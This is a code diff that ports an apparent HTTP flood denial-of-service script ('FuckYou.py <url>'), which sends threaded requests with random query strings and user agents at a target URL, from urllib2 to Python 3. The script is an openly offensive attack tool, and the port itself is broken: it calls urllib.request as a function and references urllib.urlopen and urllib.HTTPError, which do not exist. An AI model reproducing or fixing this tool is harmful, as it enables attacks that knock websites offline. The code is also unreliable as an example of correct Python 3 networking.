@@ -14,9 +14,11 @@
 
 # author : Professor, version 1.0, @IndianWatchdogs
 
-# ---------------------------------------------------------------------------------------------
+# ----------------------------------------------------------------------------------------------
 
-import urllib
+import urllib.request
+import urllib.error
+
 import sys
 
 import threading
@@ -131,7 +133,7 @@ def buildblock(size):
 
 def usage():
 
-	print ('---------------------------------------------------')
+	print('---------------------------------------------------')
 
 	print ('USAGE: python FuckYou.py <url>')
 
@@ -161,7 +163,7 @@ def httpcall(url):
 
 		param_joiner="?"
 
-	request = urllib.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	request = urllib.request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
 
 	request.add_header('User-Agent', random.choice(headers_useragents))
 
@@ -179,9 +181,9 @@ def httpcall(url):
 
 	try:
 
-			urllib2.urlopen(request)
+			urllib.urlopen(request)
 
-	except (urllib2.HTTPError, e):
+	except urllib.HTTPError as e:
 
 			#print e.code
 
@@ -191,7 +193,7 @@ def httpcall(url):
 
 			code=500
 
-	except (urllib2.URLError, e):
+	except urllib.URLError as e:
 
 			#print e.reason
 
@@ -201,7 +203,7 @@ def httpcall(url):
 
 			inc_counter()
 
-			urllib2.urlopen(request)
+			urllib.urlopen(request)
 
 	return(code)		
 
@@ -211,21 +213,22 @@ def httpcall(url):
 
 class HTTPThread(threading.Thread):
 
-    def run(self):
+	def run(self):
 
-        try:
+		try:
 
-            while flag < 2:
+			while flag<2:
 
-                code = httpcall(url)
+				code=httpcall(url)
 
-                if code == 500 and safe == 1:
+				if (code==500) & (safe==1):
 
-                    set_flag(2)
+					set_flag(2)
 
-        except (Exception, e):
+		except Exception as ex:
 
-            print(f"Error occurred: {e}")
+			pass
+
 
 # monitors http threads and counts requests
 
@@ -237,8 +240,7 @@ class MonitorThread(threading.Thread):
 
 		while flag==0:
 
-			if (previous + 100 < request_counter) and (previous != request_counter):
-
+			if (previous+100<request_counter) & (previous!=request_counter):
 
 				print ("%d Requests Sent" % (request_counter))
 
